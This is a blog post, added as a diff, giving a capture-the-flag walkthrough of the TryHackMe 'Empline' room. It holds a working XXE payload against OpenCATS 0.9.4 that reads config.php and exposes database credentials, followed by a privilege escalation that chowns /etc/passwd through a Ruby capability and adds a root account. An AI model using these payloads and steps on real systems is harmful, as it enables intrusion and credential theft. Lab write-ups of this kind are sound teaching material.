@@ -1,0 +1,256 @@
+---
+title: 'TryHackMe Empline Writeup'
+excerpt: 'Empline is a boot2root style hacking challenge created by zyeinn over at TryHackMe. This is how I solved it!'
+date: '19 Sep 2021'
+---
+
+# Introduction
+
+Empline is a boot2root style hacking challenge created by [zyeinn](https://tryhackme.com/p/zyeinn) over at [TryHackMe](https://tryhackme.com/room/empline). It involves a web application vulnerable to XXE, a MariaDB database, and chowing files with Ruby. Here’s how I solved it.
+
+# Getting the user flag
+
+I started by performing a port scan with Nmap. It returned that 22, 80, and 3306 were running SSH, HTTP, and MySQL, respectively.
+
+```bash
+nmap -sCV -oN nmap/initial <IP>
+Nmap scan report for <IP>
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+| 2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
+| 256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
+|_ 256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
+80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Empline
+3306/tcp open mysql MySQL 5.5.5–10.1.48-MariaDB-0ubuntu0.18.04.1
+| mysql-info:
+| Protocol: 10
+| Version: 5.5.5–10.1.48-MariaDB-0ubuntu0.18.04.1
+| Thread ID: 30
+| Capabilities flags: 63487
+| Some Capabilities: LongPassword, SupportsTransactions, Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, LongColumnFlag, DontAllowDatabaseTableColumn, InteractiveClient, ConnectWithDatabase, Speaks41ProtocolNew, SupportsCompression, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+| Status: Autocommit
+| Salt: }n0A97G>DxRoZTsi5k<)
+|_ Auth Plugin Name: mysql_native_password
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Further enumerating, the webserver hosted a static single-page website.
+![image](https://miro.medium.com/max/700/1*ZpqgxOQcJBQHMBRjfUe0Zg.png)
+
+I looked for interesting files or directories, but there was not much going on. One specific subdomain showed up when fuzzing for virtual hosts.
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://empline.thm  -H "Host: FUZZ.empline.thm" -fs 14058
+/'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+v1.3.1 Kali Exclusive <3
+________________________________________________
+:: Method           : GET
+ :: URL              : http://empline.thm
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.empline.thm
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 14058
+________________________________________________
+job                     [Status: 200, Size: 3671, Words: 209, Lines: 102]
+```
+
+job.empline.thm was running opencats, an open-source applicant tracking system.
+
+![image](https://miro.medium.com/max/700/1*ie4pjAC5ij5vX8IdMkcsbA.png)
+
+I quickly found a known vulnerability by searching on Google for version 0.9.4 which was disclosed on the login page: read the article [here](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/).
+
+Directory bruteforcing with Gobuster revealed the path to the careers portal.
+
+```bash
+gobuster dir -u http://job.empline.thm/ -w /usr/share/wordlists/dirb/big.txt
+/.htaccess            (Status: 403) [Size: 280]
+/.htpasswd            (Status: 403) [Size: 280]
+/ajax                 (Status: 301) [Size: 317]
+/attachments          (Status: 301) [Size: 324]
+/careers              (Status: 301) [Size: 320]
+/ci                   (Status: 301) [Size: 315]
+/ckeditor             (Status: 301) [Size: 321]
+/db                   (Status: 301) [Size: 315]
+/images               (Status: 301) [Size: 319]
+/javascript           (Status: 301) [Size: 323]
+/js                   (Status: 301) [Size: 315]
+/lib                  (Status: 301) [Size: 316]
+/modules              (Status: 301) [Size: 320]
+/rss                  (Status: 301) [Size: 316]
+/scripts              (Status: 301) [Size: 320]
+/server-status        (Status: 403) [Size: 280]
+/src                  (Status: 301) [Size: 316]
+/temp                 (Status: 301) [Size: 317]
+/test                 (Status: 301) [Size: 317]
+/upload               (Status: 301) [Size: 319]
+/vendor               (Status: 301) [Size: 319]
+/wsdl                 (Status: 301) [Size: 317]
+/xml                  (Status: 301) [Size: 316]
+```
+
+Following the instructions from the doddsecurity article above, I created a .docx document using Python.
+
+```python
+#!/usr/bin/env python3
+from docx import Document
+document = Document()
+paragraph = document.add_paragraph("infamous55")
+document.save("document.docx")
+```
+
+Then, I unzipped it with `unzip document.docx`. I added the following as the second line to the newly created word/document.xml file, and I replaced my username with **&test;** as well.
+
+```
+<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
+```
+
+After saving and recreating the document, I uploaded it to the job post and got back the base64 encoded configuration file. Reading the contents of _config.php_, I got the credentials for connecting to the MySQL database.
+
+```
+define('DATABASE_USER', 'james');
+define('DATABASE_PASS', '<REDACTED>');
+```
+
+Once authenticated, I checked the available databases and tables.
+
+```bash
+mysql -h empline.thm -u james -p
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| opencats           |
++--------------------+
+2 rows in set (0.078 sec)
+MariaDB [(none)]> use opencats;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+MariaDB [opencats]> show tables;
++--------------------------------------+
+| Tables_in_opencats                   |
++--------------------------------------+
+| access_level                         |
+| activity                             |
+| activity_type                        |
+| attachment                           |
+| calendar_event                       |
+| calendar_event_type                  |
+| candidate                            |
+| candidate_joborder                   |
+| candidate_joborder_status            |
+| candidate_joborder_status_history    |
+| candidate_jobordrer_status_type      |
+| candidate_source                     |
+| candidate_tag                        |
+| career_portal_questionnaire          |
+| career_portal_questionnaire_answer   |
+| career_portal_questionnaire_history  |
+| career_portal_questionnaire_question |
+| career_portal_template               |
+| career_portal_template_site          |
+| company                              |
+| company_department                   |
+| contact                              |
+| data_item_type                       |
+| eeo_ethnic_type                      |
+| eeo_veteran_type                     |
+| email_history                        |
+| email_template                       |
+| extension_statistics                 |
+| extra_field                          |
+| extra_field_settings                 |
+| feedback                             |
+| history                              |
+| http_log                             |
+| http_log_types                       |
+| import                               |
+| installtest                          |
+| joborder                             |
+| module_schema                        |
+| mru                                  |
+| queue                                |
+| saved_list                           |
+| saved_list_entry                     |
+| saved_search                         |
+| settings                             |
+| site                                 |
+| sph_counter                          |
+| system                               |
+| tag                                  |
+| user                                 |
+| user_login                           |
+| word_verification                    |
+| xml_feed_submits                     |
+| xml_feeds                            |
+| zipcodes                             |
++--------------------------------------+
+54 rows in set (0.112 sec)
+MariaDB [opencats]> select * from user;
+```
+
+There I found the hashed password for the george user. I cracked it on [https://crackstation.net/](https://crackstation.net/), then I connected using SSH and got the user flag.
+
+```bash
+> ssh george@empline.thm
+george@empline:~$ wc -c user.txt
+33 user.txt
+```
+
+# Getting the root flag
+
+As for local enumeration, I ran linpeas.sh on the target machine. The script showed one particular result:
+
+```
+Files with capabilities:
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/local/bin/ruby = cap_chown+ep
+```
+
+This meant that I could chown files using Ruby. The one file I could also read and use to my advantage that came to my mind was _/etc/passwd_. Here’s the Ruby script I used:
+
+```ruby
+file = File.new("/etc/passwd", "r")
+file.chown(1002, 1002)
+```
+
+Note that 1002 is the id of the user george.
+
+Next, I added a new root user in the _/etc/passwd_ file.
+
+```
+infamous55:<HASHED_PASS>:0:0:root:/root:/bin/bash
+```
+
+**\<HASHED_PASS\>** represents the hashed password I created using `mkpasswd -m sha-512` on my local machine.
+
+After that, I switched to the newly created user and read the final flag.
+
+```
+george@empline:/tmp$ su infamous55
+Password: <YOUR_PASS>
+root@empline:/tmp# wc -c /root/root.txt
+33 /root/root.txt
+```
+
+# Conclusion
+
+Overall, I enjoyed this room. The privilege escalation part using Ruby stood out to me, and I think it was well-made. Thank you to the creator of this challenge, and thank you for reading my writeup!
+
+Feel free to contact me on [Twitter](https://twitter.com/infamous551)!
